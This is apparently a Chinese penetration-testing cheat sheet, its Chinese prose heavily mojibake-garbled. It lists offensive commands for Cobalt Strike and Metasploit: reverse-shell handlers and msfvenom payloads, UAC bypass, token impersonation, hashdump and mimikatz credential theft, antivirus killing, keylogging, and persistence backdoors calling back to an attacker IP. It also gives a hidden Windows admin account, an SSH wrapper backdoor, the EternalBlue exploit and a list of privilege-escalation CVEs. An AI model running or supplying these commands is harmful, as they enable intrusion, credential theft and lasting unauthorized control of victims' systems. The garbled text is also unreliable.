# Speed-PenTestğŸ•¶
`æ¸—é€æ‰‹å†Œ`
[TOC]

---

# 0ç‘å£«å†›åˆ€/å®‰å…¨å·¥å…·/æ¡†æ¶
## cobaltstrike
æœåŠ¡ç«¯
`./teamserver ä½ çš„IP ä½ çš„å¯†ç `
å®¢æˆ·ç«¯
`java -Dfile.encoding=UTF-8 -javaagent:CobaltStrikeCN.jar -XX:ParallelGCThreads=4 -XX:+AggressiveHeap -XX:+UseParallelGC -jar cobaltstrike.jar`
æˆ–
`javaw -Dfile.encoding=UTF-8 -javaagent:CobaltStrikeCN.jar -XX:ParallelGCThreads=4 -XX:+AggressiveHeap -XX:+UseParallelGC -jar cobaltstrike.jar`

**çˆ†ç ´ cobaltstrike teamserver**
```bash
git clone https://github.com/ryanohoro/csbruter
cd csbruter
cat wordlist.txt | python3 csbruter.py xxx.xxx.xxx.xxx
```

**Thank**
- [cobalt strike å¿«é€Ÿä¸Šæ‰‹ [ ä¸€ ] - FreeBufä¸“æ Â·æ”»é˜²ä¹‹è·¯](https://www.freebuf.com/column/149236.html)
- [æ•™ä½ ä¿®æ”¹cobalt strikeçš„50050ç«¯å£ - 3HACK](https://www.3hack.com/note/96.html)
- [ryanohoro/csbruter: Cobalt Strike team server password brute force tool](https://github.com/ryanohoro/csbruter)

---

## metasploit
Q:Module database cache not built yet, using slow search
A:
```bash
service postgresql start
msfdb init
db_rebuild_cache
```

### meterpreter
**meterpreterå¿«é€Ÿä¸Šæ‰‹**
```bash
shell   #è·å–ç›®æ ‡ä¸»æœºçš„ cmd shell
getsystem #å‘½ä»¤å¯ä»¥ææƒåˆ°æœ¬åœ°ç³»ç»Ÿæƒé™
sysinfo #æ˜¾ç¤ºç³»ç»Ÿåï¼Œæ“ä½œç³»ç»Ÿï¼Œæ¶æ„å’Œè¯­è¨€ç­‰ã€‚
```

#### è·å–ä¼šè¯
**handler**
```bash
use exploit/multi/handler
set payload windows/x64/meterpreter_reverse_tcp
set LHOST
set LPORT
exploit -j  #åå°æ‰§è¡Œ
```

**cmdshell å‡çº§ä¸º meterpreter**
å¦‚æœæœ€å¼€å§‹è·å–çš„æ˜¯ cmdshellï¼Œåæ¥å‘ç°è¿™å°æœºå™¨éå¸¸é€‚åˆä½œä¸ºæµ‹è¯•å…¶å®ƒç»ˆç«¯çš„è·³æ¿ï¼Œè¿™ä¸ªæ—¶å€™ cmdshell çš„åŠŸèƒ½å·²ç»ä¸èƒ½æ»¡è¶³éœ€è¦ï¼Œå‡çº§æˆ meterpreter å°±ååˆ†æœ‰å¿…è¦ã€‚
`sessions -u "id"` å°†è¯¥ cmdshell å‡çº§æˆ meterpreter

#### ææƒ
**ç»•è¿‡ UAC**
é€šå¸¸ webshell çš„æƒé™éƒ½æ¯”è¾ƒä½ï¼Œèƒ½å¤Ÿæ‰§è¡Œçš„æ“ä½œæœ‰é™ï¼Œæ²¡æ³•æŸ¥çœ‹é‡è¦æ–‡ä»¶ã€ä¿®æ”¹ç³»ç»Ÿä¿¡æ¯ã€æŠ“å–ç®¡ç†å‘˜å¯†ç å’Œ hashã€å®‰è£…ç‰¹æ®Šç¨‹åºç­‰ï¼Œæ‰€ä»¥æˆ‘ä»¬éœ€è¦è·å–ç³»ç»Ÿæ›´é«˜çš„æƒé™
```bash
use exploit/windows/local/bypassuac #ä¸€ç³»åˆ—éƒ½å¯ç”¨
use exploit/windows/local/bypassuac_eventvwr
sessions    #æŸ¥çœ‹ç›®å‰çš„session
sessions -k #æ€æ­»æ‰€æœ‰session
set session    #è®¾ä¸ºä½ éœ€è¦exploitçš„session
```

**åˆ©ç”¨ç³»ç»Ÿæ¼æ´ææƒ**
```bash
use exploit/windows/local/ms13_081_track_popup_menu #ä»¥ms13-081ä¸ºä¾‹
set session
```

#### è¿›ç¨‹è¿ç§»
å½“meterpreterå•ç‹¬ä½œä¸ºä¸€ä¸ªè¿›ç¨‹è¿è¡Œæ—¶å®¹æ˜“è¢«å‘ç°ï¼Œå¦‚æœå°†å®ƒå’Œç³»ç»Ÿç»å¸¸è¿è¡Œçš„è¿›ç¨‹è¿›è¡Œç»‘å®šï¼Œå°±èƒ½å¤Ÿå®ç°æŒä¹…åŒ–ã€‚
```bash
getpid  #æŸ¥çœ‹å½“å‰ä¼šè¯çš„è¿›ç¨‹id
ps  #æŸ¥çœ‹ç›®æ ‡è¿è¡Œçš„è¿›ç¨‹
migrate pid #ç»‘å®šè¿›ç¨‹
```

#### ä»¤ç‰Œå‡å†’
åœ¨ç”¨æˆ·ç™»å½• windows æ“ä½œç³»ç»Ÿæ—¶ï¼Œç³»ç»Ÿéƒ½ä¼šç»™ç”¨æˆ·åˆ†é…ä¸€ä¸ªä»¤ç‰Œ(Token)ï¼Œå½“ç”¨æˆ·è®¿é—®ç³»ç»Ÿèµ„æºæ—¶éƒ½ä¼šä½¿ç”¨è¿™ä¸ªä»¤ç‰Œè¿›è¡Œèº«ä»½éªŒè¯ï¼ŒåŠŸèƒ½ç±»ä¼¼äºç½‘ç«™çš„ session æˆ–è€… cookieã€‚

msfæä¾›äº†ä¸€ä¸ªåŠŸèƒ½æ¨¡å—å¯ä»¥è®©æˆ‘ä»¬å‡å†’åˆ«äººçš„ä»¤ç‰Œï¼Œå®ç°èº«ä»½åˆ‡æ¢ï¼Œå¦‚æœç›®æ ‡ç¯å¢ƒæ˜¯åŸŸç¯å¢ƒï¼Œåˆšå¥½åŸŸç®¡ç†å‘˜ç™»å½•è¿‡æˆ‘ä»¬å·²ç»æœ‰æƒé™çš„ç»ˆç«¯ï¼Œé‚£ä¹ˆå°±å¯ä»¥å‡å†’æˆåŸŸç®¡ç†å‘˜çš„è§’è‰²ã€‚
```bash
getuid  #æŸ¥çœ‹å½“å‰ç”¨æˆ·
use incognito   #è¿›å…¥è¯¥æ¨¡å—
list_tokens -u  #æŸ¥çœ‹å­˜åœ¨çš„ä»¤ç‰Œ
impersonate_token ç”¨æˆ·å  #ä»¤ç‰Œå‡å†’
#æ³¨æ„ç”¨æˆ·åçš„æ–œæ éœ€è¦å†™ä¸¤ä¸ªã€‚

getuid  #æŸ¥çœ‹æ˜¯å¦åˆ‡æ¢æˆåŠŸ
```

#### è·å–å‡­è¯
```bash
run hashdump

load mimikatz   #åŠ è½½mimikatzæ¨¡å—
wdigest
kerberos
```

#### æ“ä½œæ–‡ä»¶ç³»ç»Ÿ
**åŸºæœ¬æ“ä½œ**
```bash
lsï¼šåˆ—å‡ºå½“å‰è·¯å¾„ä¸‹çš„æ‰€æœ‰æ–‡ä»¶å’Œæ–‡ä»¶å¤¹ã€‚
pwd æˆ– getwdï¼šæŸ¥çœ‹å½“å‰è·¯å¾„
searchï¼šæœç´¢æ–‡ä»¶ï¼Œä½¿ç”¨search -hæŸ¥çœ‹å¸®åŠ©ã€‚
catï¼šæŸ¥çœ‹æ–‡ä»¶å†…å®¹ï¼Œæ¯”å¦‚cat test.txtã€‚
editï¼šç¼–è¾‘æˆ–è€…åˆ›å»ºæ–‡ä»¶ã€‚å’ŒLinuxç³»ç»Ÿçš„vmå‘½ä»¤ç±»ä¼¼ï¼ŒåŒæ ·é€‚ç”¨äºç›®æ ‡ç³»ç»Ÿæ˜¯windowsçš„æƒ…å†µã€‚
rmï¼šåˆ é™¤æ–‡ä»¶ã€‚
cdï¼šåˆ‡æ¢è·¯å¾„ã€‚
mkdirï¼šåˆ›å»ºæ–‡ä»¶å¤¹ã€‚
rmdirï¼šåˆ é™¤æ–‡ä»¶å¤¹ã€‚
getlwd æˆ– lpwdï¼šæŸ¥çœ‹è‡ªå·±ç³»ç»Ÿçš„å½“å‰è·¯å¾„ã€‚
lcdï¼šåˆ‡æ¢è‡ªå·±å½“å‰ç³»ç»Ÿçš„ç›®å½•ã€‚
llsï¼šæ˜¾ç¤ºè‡ªå·±å½“å‰ç³»ç»Ÿçš„æ‰€æœ‰æ–‡ä»¶å’Œæ–‡ä»¶å¤¹ã€‚
```

**ä¸Šä¼ å’Œä¸‹è½½**
```bash
upload <file> <destination> #ä¸Šä¼ æ–‡ä»¶åˆ° Windows ä¸»æœº
#æ³¨æ„ï¼šä½¿ç”¨ -r å‚æ•°å¯ä»¥é€’å½’ä¸Šä¼ ä¸Šä¼ ç›®å½•å’Œæ–‡ä»¶

download <file> <path to save>  #ä» windows ä¸»æœºä¸‹è½½æ–‡ä»¶
#æ³¨æ„ï¼šWindows è·¯å¾„è¦ä½¿ç”¨åŒæ–œçº¿
#å¦‚æœæˆ‘ä»¬éœ€è¦é€’å½’ä¸‹è½½æ•´ä¸ªç›®å½•åŒ…æ‹¬å­ç›®å½•å’Œæ–‡ä»¶ï¼Œæˆ‘ä»¬å¯ä»¥ä½¿ç”¨ download -rå‘½ä»¤
```

#### å…¶å®ƒæ“ä½œ
**å…³é—­é˜²ç—…æ¯’è½¯ä»¶**
`run killav`
`run post/windows/manage/killav`

**æ“ä½œè¿œç¨‹æ¡Œé¢**
`run post/windows/manage/enable_rdp` å¼€å¯è¿œç¨‹æ¡Œé¢
`run post/windows/manage/enable_rdp username=test password=test` æ·»åŠ è¿œç¨‹æ¡Œé¢çš„ç”¨æˆ·(åŒæ—¶ä¹Ÿä¼šå°†è¯¥ç”¨æˆ·æ·»åŠ åˆ°ç®¡ç†å‘˜ç»„)

**æˆªå±**
`screenshot`

**é”®ç›˜è®°å½•**
```bash
keyscan_startï¼šå¼€å¯é”®ç›˜è®°å½•åŠŸèƒ½
keyscan_dumpï¼šæ˜¾ç¤ºæ•æ‰åˆ°çš„é”®ç›˜è®°å½•ä¿¡æ¯
keyscan_stopï¼šåœæ­¢é”®ç›˜è®°å½•åŠŸèƒ½
```

**æ‰§è¡Œç¨‹åº**
```bash
execute -f <path> [options] åœ¨ç›®æ ‡ä¸»æœºä¸Šæ‰§è¡Œ exe æ–‡ä»¶
-Hï¼šåˆ›å»ºä¸€ä¸ªéšè—è¿›ç¨‹
-aï¼šä¼ é€’ç»™å‘½ä»¤çš„å‚æ•°
-iï¼šè·Ÿè¿›ç¨‹è¿›è¡Œäº¤äº’
-mï¼šä»å†…å­˜ä¸­æ‰§è¡Œ
-tï¼šä½¿ç”¨å½“å‰ä¼ªé€ çš„çº¿ç¨‹ä»¤ç‰Œè¿è¡Œè¿›ç¨‹
-sï¼šåœ¨ç»™å®šä¼šè¯ä¸­æ‰§è¡Œè¿›ç¨‹
```

#### ç«¯å£è½¬å‘å’Œå†…ç½‘ä»£ç†
**portfwd**
portfwd æ˜¯ meterpreter æä¾›çš„ç«¯å£è½¬å‘åŠŸèƒ½ï¼Œåœ¨ meterpreter ä¸‹ä½¿ç”¨ portfwd -h å‘½ä»¤æŸ¥çœ‹è¯¥å‘½ä»¤çš„å‚æ•°ã€‚
```bash
portfwd add -l 2222 -r 1.1.1.1 -p 3389 #å°†1.1.1.3çš„3389ç«¯å£è½¬å‘åˆ°æœ¬åœ°çš„2222ç«¯å£ã€‚
-lï¼šæœ¬åœ°ç›‘å¬ç«¯å£
-rï¼šå†…ç½‘ç›®æ ‡çš„ip
-pï¼šå†…ç½‘ç›®æ ‡çš„ç«¯å£
```

**pivot**
pivot æ˜¯ msf æœ€å¸¸ç”¨çš„ä»£ç†ï¼Œå¯ä»¥è®©æˆ‘ä»¬ä½¿ç”¨ msf æä¾›çš„æ‰«ææ¨¡å—å¯¹å†…ç½‘è¿›è¡Œæ¢æµ‹ã€‚
```bash
route add å†…ç½‘ip å­ç½‘æ©ç  sessionçš„id #æ·»åŠ ä¸€ä¸ªè·¯ç”±
route print

å¦‚æœå…¶å®ƒç¨‹åºéœ€è¦è®¿é—®è¿™ä¸ªå†…ç½‘ç¯å¢ƒï¼Œå°±å¯ä»¥å»ºç«‹socksä»£ç†
msfæä¾›äº†3ä¸ªæ¨¡å—ç”¨æ¥åšsocksä»£ç†ã€‚
auxiliary/server/socks4a
auxiliary/server/socks5
auxiliary/server/socks_unc

use auxiliary/server/socks4a
SRVHOSTï¼šç›‘å¬çš„ipåœ°å€ï¼Œé»˜è®¤ä¸º0.0.0.0ï¼Œä¸€èˆ¬ä¸éœ€è¦æ›´æ”¹ã€‚
SRVPORTï¼šç›‘å¬çš„ç«¯å£ï¼Œé»˜è®¤ä¸º1080ã€‚
ç›´æ¥è¿è¡Œrunå‘½ä»¤ï¼Œå°±å¯ä»¥æˆåŠŸåˆ›å»ºä¸€ä¸ªsocks4ä»£ç†éš§é“ï¼Œåœ¨linuxä¸Šå¯ä»¥é…ç½®proxychainsä½¿ç”¨ï¼Œåœ¨windowså¯ä»¥é…ç½®Proxifierè¿›è¡Œä½¿ç”¨ã€‚
```

#### åé—¨
Meterpreterçš„shellè¿è¡Œåœ¨å†…å­˜ä¸­ï¼Œç›®æ ‡é‡å¯å°±ä¼šå¤±æ•ˆï¼Œå¦‚æœç®¡ç†å‘˜ç»™ç³»ç»Ÿæ‰“ä¸Šè¡¥ä¸ï¼Œé‚£ä¹ˆå°±æ²¡åŠæ³•å†æ¬¡ä½¿ç”¨exploitè·å–æƒé™ï¼Œæ‰€ä»¥éœ€è¦æŒä¹…çš„åé—¨å¯¹ç›®æ ‡è¿›è¡Œæ§åˆ¶
**metsvc**
```bash
run metsvc 
#å‘½ä»¤è¿è¡ŒæˆåŠŸåä¼šåœ¨ C:WindowsTEMP ç›®å½•ä¸‹æ–°å»ºéšæœºåç§°çš„æ–‡ä»¶å¤¹ï¼Œé‡Œé¢ç”Ÿæˆ3ä¸ªæ–‡ä»¶(metsvc.dllã€metsvc-server.exeã€metsvc.exe)
#åŒæ—¶ä¼šæ–°å»ºä¸€ä¸ªæœåŠ¡ï¼Œæ˜¾ç¤ºåç§°ä¸ºMeterpreterï¼ŒæœåŠ¡åç§°ä¸ºmetsvcï¼Œå¯åŠ¨ç±»å‹ä¸ºâ€è‡ªåŠ¨â€,ç»‘å®šåœ¨31337ç«¯å£ã€‚

use exploit/multi/handler
set payload windows/metsvc_bind_tcp
set rhost xxx.xxx.xxx.xxx
set lport 31337
```

**persistence**
```bash
run persistence -X -i 10 -r 192.168.1.9 -p 4444
-Aï¼šå®‰è£…åé—¨åï¼Œè‡ªåŠ¨å¯åŠ¨exploit/multi/handleræ¨¡å—è¿æ¥åé—¨
-Lï¼šè‡ªå¯åŠ¨è„šæœ¬çš„è·¯å¾„ï¼Œé»˜è®¤ä¸º%TEMP%
-Pï¼šéœ€è¦ä½¿ç”¨çš„payloadï¼Œé»˜è®¤ä¸ºwindows/meterpreter/reverse_tcp
-Sï¼šä½œä¸ºä¸€ä¸ªæœåŠ¡åœ¨ç³»ç»Ÿå¯åŠ¨æ—¶è¿è¡Œï¼ˆéœ€è¦SYSTEMæƒé™ï¼‰
-Tï¼šè¦ä½¿ç”¨çš„å¤‡ç”¨å¯æ‰§è¡Œæ¨¡æ¿
-Uï¼šç”¨æˆ·ç™»é™†æ—¶è¿è¡Œ
-Xï¼šç³»ç»Ÿå¯åŠ¨æ—¶è¿è¡Œ
-iï¼šåé—¨æ¯éš”å¤šå°‘ç§’å°è¯•è¿æ¥æœåŠ¡ç«¯
-pï¼šæœåŠ¡ç«¯ç›‘å¬çš„ç«¯å£
-rï¼šæœåŠ¡ç«¯ip
```

**Thank**
- [linux - Metasploit: Module database cache not built yet, using slow search - Server Fault](https://serverfault.com/questions/761672/metasploit-module-database-cache-not-built-yet-using-slow-search)
- [Metasploitå…¥é—¨ç”¨æ³•ï¼ˆä¸»åŠ¨æ”»å‡»ï¼‰ - CSDNåšå®¢](https://blog.csdn.net/wsh19930305/article/details/72855660)
- [meterpreterå¿…çŸ¥å¿…ä¼šçš„15ä¸ªå‘½ä»¤](https://www.4hou.com/tools/14185.html)
- [èŒæ–°ç§‘æ™® æ‰‹æŠŠæ‰‹æ•™ä½ å¦‚ä½•ç”¨MSFè¿›è¡Œåæ¸—é€æµ‹è¯•](https://www.anquanke.com/post/id/164525)

---

# 1Crypto
## å„ç§çˆ†ç ´


---

# 2Misc
## æƒé™ç»´æŒ/åä¾¦å¯Ÿ
### é€šç”¨
#### msfvenom
`msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=xxx.xxx.xxx.xxx LPORT=xxxx -f exe > ./vu.exe`

#### Veil
- **å®‰è£…**
```bash
git clone https://github.com/Veil-Framework/Veil.git
cd Veil/setup/
sudo ./setup.sh â€“c
sudo ./Veil.py
```

#### HERCULES
- **å®‰è£…**
```bash
ç¡®ä¿ç”µè„‘é‡Œæœ‰Go
git clone https://github.com/noosec/HERCULES.git
cd HERCULES
wget -c https://github.com/fatih/color
go get github.com/fatih/color
go run Setup.go
cp -rf /root/go/src/github.com /usr/lib/go-1.7/src/github.com
cd SOURCE/
go run HERCULES.go
```

#### ASWCrypter
#### VENOM
#### metasploit-framework
```bash
use evasion/windows/windows_defender_exe
set payload windows/x64/meterpreter/reverse_tcp
set lhost 
set lport
run
```

---

### win
#### åˆ›å»ºåé—¨è´¦å·
```bash
net user PHPNET$ 1234abcd~ /add #æ·»åŠ ç”¨æˆ·
#Windows çš„å¸å·åç§°åå¸¦ç€â€œ$â€ç¬¦å·æ—¶ï¼Œä¸ä¼šåœ¨ net user å‘½ä»¤ä¸­æ˜¾ç¤ºå‡ºå¸å·ä¿¡æ¯
net localgroup administrators PHPNET$ /add #å°†ç”¨æˆ·æ·»åŠ åˆ°ç®¡ç†ç»„
net user PHPNET$ /del #åˆ é™¤ç”¨æˆ·

query user #æŸ¥çœ‹ä¼šè¯

logoff IDå· #è¸¢æ‰
```

### linux
#### åé—¨
**SSH wrapper**
SSH wrapperåé—¨ï¼Œæ²¡æœ‰å¼€æ”¾é¢å¤–çš„ç«¯å£ï¼Œåªè¦å¯¹æ–¹å¼€äº†SSHæœåŠ¡ï¼Œå°±èƒ½è¿œç¨‹è¿æ¥
```bash
cd /usr/sbin
mv sshd ../bin
echo '#!/usr/bin/perl' >sshd
echo 'exec "/bin/sh" if (getpeername(STDIN) =~ /^..4A/);' >>sshd
echo 'exec {"/usr/bin/sshd"} "/usr/sbin/sshd",@ARGV,' >>sshd
chmod u+x sshd
/etc/init.d/sshd restart
```
æŠ±æ­‰ï¼Œå®é™…æµ‹è¯•æœªæˆåŠŸ

**Vegile**
This tool will set up your backdoor/rootkits when backdoor is already setup it will be hidden your specific process,unlimited your session in metasploit and transparent. Even when it is killed, it will re-run again. There will always be a procces which will run another process, so we can assume that this procces is unstopable like a Ghost in The Shell
```bash
git clone https://github.com/Screetsec/Vegile.git
cd Vegile
chmod +x Vegile
```



### éšåŒ¿æ”»å‡»
#### ç«¯å£è½¬å‘
**ew**

---

## ä¿¡æ¯æ”¶é›†
### ç½‘ç»œ
- **TTLæ¥åˆ¤æ–­ç›®çš„ä¸»æœºçš„æ“ä½œç³»ç»Ÿç±»å‹**
ä¸‹é¢æ˜¯é»˜è®¤æ“ä½œç³»ç»Ÿçš„TTLï¼š
```bash
1ã€WINDOWS NT/2000   TTLï¼š128
2ã€WINDOWS 95/98     TTLï¼š32
3ã€UNIX              TTLï¼š255
4ã€LINUX             TTLï¼š64
5ã€WIN7              TTLï¼š64
```

- **ä¿®æ”¹æœ¬æœºç”µè„‘ä¸Šé¢çš„é»˜è®¤TTLå€¼**
é€šè¿‡ä¿®æ”¹æœ¬æœºä¸Šçš„TTLå€¼å¯ä»¥æ··æ·†æ”»å‡»è€…çš„åˆ¤æ–­ï¼ˆå½“ç„¶ï¼Œå¾ˆå°‘æœ‰ç”¨æˆ·ä¼šè¿™ä¹ˆåšï¼‰ã€‚TTL å€¼åœ¨æ³¨å†Œè¡¨çš„ä½ç½®æ˜¯ï¼š`HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters `å…¶ä¸­æœ‰ä¸ª DefaultTTL çš„ DWORD å€¼ï¼Œå…¶æ•°æ®å°±æ˜¯é»˜è®¤çš„ TTL å€¼äº†ï¼Œæˆ‘ä»¬å¯ä»¥ä¿®æ”¹ DefaultTTL é‡Œé¢çš„ TTL é»˜è®¤å€¼ï¼Œä½†ä¸èƒ½å¤§äºåè¿›åˆ¶çš„ 255ã€‚

#### IPæ‰«
>netdiscover -r 1.1.1.0/24

### ç½‘ç«™
#### CDN/æŸ¥æºIP
- **Nslookupæ³•**
`nslookup + åŸŸå`

- **å¤šåœ°pingåŸŸåæ³•**
åˆ©ç”¨åœ¨çº¿ç½‘ç«™æœåŠ¡å¤šåœ° ping æµ‹è¯•

- **â€œå¸¸è¯†â€åˆ¤æ–­æ³•**
åœ¨åæŸ¥ç½‘ç«™ ip æ—¶ï¼Œå¦‚æœæ­¤ç½‘ç«™æœ‰ 1000 å¤šä¸ªä¸åŒåŸŸåï¼Œé‚£ä¹ˆè¿™ä¸ª ip å¤šåŠä¸æ˜¯çœŸå® ipã€‚
å¦‚æœä¸€ä¸ª asp æˆ–è€… asp.net ç½‘ç«™è¿”å›çš„å¤´å­—æ®µçš„ server ä¸æ˜¯ IISã€è€Œæ˜¯ Nginxï¼Œé‚£ä¹ˆå¤šåŠæ˜¯ç”¨äº† nginx åå‘ä»£ç†ï¼Œè€Œä¸æ˜¯çœŸå® ipã€‚
å¦‚æœ ip å®šä½æ˜¯åœ¨å¸¸è§ cdn æœåŠ¡å•†çš„æœåŠ¡å™¨ä¸Šï¼Œé‚£ä¹ˆæ˜¯çœŸå® ip çš„å¯èƒ½æ€§å°±å¾®ä¹å…¶å¾®äº†ã€‚

- **å­åŸŸåæŸ¥æ‰¾æ³•**
åˆ©ç”¨ä¸€äº›åœ¨çº¿æŸ¥è¯¢çš„ç½‘ç«™
https://x.threatbook.cn/
https://dnsdb.io/zh-cn/ åªéœ€è¾“å…¥ baidu.com type:A å°±èƒ½æ”¶é›†ç™¾åº¦çš„å­åŸŸåå’Œ ip
Google æœç´¢ Google site:baidu.com -www å°±èƒ½æŸ¥çœ‹é™¤ www å¤–çš„å­åŸŸå

- **ä½¿ç”¨å­åŸŸåæ‰«æå™¨**
ä¾‹å¦‚å­åŸŸåæŒ–æ˜æœºå’Œ subdomainbrute(https://github.com/lijiejie/subDomainsBrute)

æ€»ç»“ï¼šæ”¶é›†å­åŸŸååå°è¯•ä»¥è§£æ ip ä¸åœ¨ CDN ä¸Šçš„ ip è§£æä¸»ç«™ï¼ŒçœŸå® ip æˆåŠŸè¢«è·å–åˆ°ã€‚

### ä¸»æœº
#### ç«¯å£æ‰«
`nmap -T5 -A -v 1.1.1.1`

#### windows
```bash
systeminfo
```

##### åŸŸä¿¡æ¯
- åŸŸç”¨æˆ·åˆ—è¡¨
    a.åˆ†æç‰¹æƒç”¨æˆ·ç»„
    b.å®šä½æŒ‡å®šç”¨æˆ·

- ADä¿¡æ¯æ”¶é›†
    a.GPO
    b.ç‰¹æƒä»¤ç‰Œ
    c.ä¿¡ä»»å…³ç³»
    d.å®šä½æŒ‡å®šæœºå™¨

---

# 6å†…/å¤–ç½‘
## WAN
### dns
#### CVE-1999-0532  dnsåŸŸä¼ é€æ¼æ´
```bash
dig @dns.xxx.edu.cn axfr xxx.edu.cn
@æŒ‡å®šåŸŸåæœåŠ¡å™¨ï¼›axfr ä¸ºåŸŸä¼ é€æŒ‡ä»¤ï¼›xxx.edu.cnè¡¨ç¤ºè¦æŸ¥è¯¢çš„åŸŸåï¼›
```

---

## windowsæ¸—é€
### exp
#### å¿«é€ŸæŸ¥æ‰¾æœªæ‰“è¡¥ä¸çš„exp
å¯ä»¥æœ€å®‰å…¨çš„å‡å°‘ç›®æ ‡æœºçš„æœªçŸ¥é”™è¯¯ï¼Œä»¥å…å½±å“ä¸šåŠ¡ã€‚
å‘½ä»¤è¡Œä¸‹æ‰§è¡Œæ£€æµ‹æœªæ‰“è¡¥ä¸çš„å‘½ä»¤å¦‚ä¸‹ï¼š
>systeminfo>micropoor.txt&(forÂ %iÂ inÂ (KB977165Â KB2160329Â KB2503665Â KB2592799 KB2707511Â KB2829361Â KB2850851Â KB3000061Â KB3045171Â KB3077657Â KB3079904 KB3134228Â KB3143141Â KB3141780)Â doÂ @typeÂ micropoor.txt|@findÂ /iÂ Â "%i"||Â @echo %iÂ youÂ canÂ fuck)&delÂ /fÂ /qÂ /aÂ micropoor.txt

æ³¨ï¼šä»¥ä¸Šéœ€è¦åœ¨å¯å†™ç›®å½•æ‰§è¡Œã€‚éœ€è¦ä¸´æ—¶ç”Ÿæˆ micrpoor.txtï¼Œä»¥ä¸Šè¡¥ä¸ç¼–å·è¯·æ ¹æ®ç¯å¢ƒæ¥å¢
åˆ ã€‚
ä¸€èˆ¬å®æˆ˜ä¸­åœ¨ç±»ä¼¼Â tmpç›®å½•ç­‰å¯å†™ç›®å½•ä¸‹æ‰§è¡Œï¼šå¦‚`C:\tmp>`

#### å¸¸ç”¨exp
##### RCE
- MS17-010 eternalblue
```bash
å‘ç°ï¼Œæ£€æµ‹
use auxiliary/scanner/smb/smb_ms17_010

ä½¿ç”¨payloadè¿ä¸Šå»
use exploit/windows/smb/ms17_010_eternalblue
set payload windows/x64/meterpreter/reverse_tcp
set lhost   #è®¾ä¸€ä¸‹æœ¬æœºåœ°å€
set rhosts 
run

msf ä¸‹
åŠ è½½mimikatzæ¨¡å—
load mimikatz
kerberos
```
- MS15-034 Vulnerability in HTTP.sys could allow remote code execution

##### ææƒ
- MS14-058
- MS15-051
- MS15-097
- MS16-014
- MS16-016
- MS16-032
- MS16-135
- MS17-017
- CVE-2017-0213
- CVE-2018-8120

##### é»‘å±
- MS12-020

#### expæ³¨
```bash
MS17-017Â ã€€[KB4013081]ã€€ã€€[GDIÂ PaletteÂ ObjectsÂ LocalÂ PrivilegeÂ Escalation]ã€€
(windowsÂ 7/8)
CVE-2017-8464Â ã€€[LNKÂ RemoteÂ CodeÂ ExecutionÂ Vulnerability]ã€€ã€€(windows
10/8.1/7/2016/2010/2008)
CVE-2017-0213Â ã€€[WindowsÂ COMÂ ElevationÂ ofÂ PrivilegeÂ Vulnerability]ã€€ã€€(windows
10/8.1/7/2016/2010/2008)
MS17-010Â ã€€[KB4013389]ã€€ã€€[WindowsÂ KernelÂ ModeÂ Drivers]ã€€ã€€(windows
7/2008/2003/XP)
MS16-135Â ã€€[KB3199135]ã€€ã€€[WindowsÂ KernelÂ ModeÂ Drivers]ã€€ã€€(2016)
MS16-111Â ã€€[KB3186973]ã€€ã€€[kernelÂ api]ã€€ã€€(WindowsÂ 10Â 10586Â (32/64)/8.1)
MS16-098Â ã€€[KB3178466]ã€€ã€€[KernelÂ Driver]ã€€ã€€(WinÂ 8.1)
MS16-075Â ã€€[KB3164038]ã€€ã€€[HotÂ Potato]ã€€ã€€(2003/2008/7/8/2012)
MS16-034Â ã€€[KB3143145]ã€€ã€€[KernelÂ Driver]ã€€ã€€(2008/7/8/10/2012)
MS16-032Â ã€€[KB3143141]ã€€ã€€[SecondaryÂ LogonÂ Handle]ã€€ã€€(2008/7/8/10/2012)
MS16-016Â ã€€[KB3136041]ã€€ã€€[WebDAV]ã€€ã€€(2008/Vista/7)
MS15-097Â ã€€[KB3089656]ã€€ã€€[remoteÂ codeÂ execution]ã€€ã€€(win8.1/2012)
MS15-076Â ã€€[KB3067505]ã€€ã€€[RPC]ã€€ã€€(2003/2008/7/8/2012)
MS15-077Â ã€€[KB3077657]ã€€ã€€[ATM]ã€€ã€€(XP/Vista/Win7/Win8/2000/2003/2008/2012)
MS15-061Â ã€€[KB3057839]ã€€ã€€[KernelÂ Driver]ã€€ã€€(2003/2008/7/8/2012)
MS15-051Â ã€€[KB3057191]ã€€ã€€[WindowsÂ KernelÂ ModeÂ Drivers]ã€€
(2003/2008/7/8/2012)
MS15-010Â ã€€[KB3036220]ã€€ã€€[KernelÂ Driver]ã€€ã€€(2003/2008/7/8)
MS15-015Â ã€€[KB3031432]ã€€ã€€[KernelÂ Driver]ã€€ã€€(Win7/8/8.1/2012/RT/2012Â R2/2008
R2)
MS15-001Â ã€€[KB3023266]ã€€ã€€[KernelÂ Driver]ã€€ã€€(2008/2012/7/8)
MS14-070Â ã€€[KB2989935]ã€€ã€€[KernelÂ Driver]ã€€ã€€(2003)
MS14-068Â ã€€[KB3011780]ã€€ã€€[DomainÂ PrivilegeÂ Escalation]ã€€ã€€(2003/2008/2012/7/8)
MS14-058Â ã€€[KB3000061]ã€€ã€€[Win32k.sys]ã€€ã€€(2003/2008/2012/7/8)
MS14-040Â ã€€[KB2975684]ã€€ã€€[AFDÂ Driver]ã€€ã€€(2003/2008/2012/7/8)
MS14-002Â ã€€[KB2914368]ã€€ã€€[NDProxy]ã€€ã€€(2003/XP)
MS13-053Â ã€€[KB2850851]ã€€ã€€[win32k.sys]ã€€ã€€(XP/Vista/2003/2008/winÂ 7)
MS13-046Â ã€€[KB2840221]ã€€ã€€[dxgkrnl.sys]ã€€ã€€(Vista/2003/2008/2012/7)
MS13-005Â ã€€[KB2778930]ã€€ã€€[KernelÂ ModeÂ Driver]ã€€ã€€(2003/2008/2012/win7/8)
MS12-042Â ã€€[KB2972621]ã€€ã€€[ServiceÂ Bus]ã€€ã€€(2008/2012/win7)
MS12-020Â ã€€[KB2671387]ã€€ã€€[RDP]ã€€ã€€(2003/2008/7/XP)
MS11-080Â ã€€[KB2592799]ã€€ã€€[AFD.sys]ã€€ã€€(2003/XP)
MS11-062Â ã€€[KB2566454]ã€€ã€€[NDISTAPI]ã€€ã€€(2003/XP)
MS11-046Â ã€€[KB2503665]ã€€ã€€[AFD.sys]ã€€ã€€(2003/2008/7/XP)
MS11-011Â ã€€[KB2393802]ã€€ã€€[kernelÂ Driver]ã€€ã€€(2003/2008/7/XP/Vista)
MS10-092Â ã€€[KB2305420]ã€€ã€€[TaskÂ Scheduler]ã€€ã€€(2008/7)
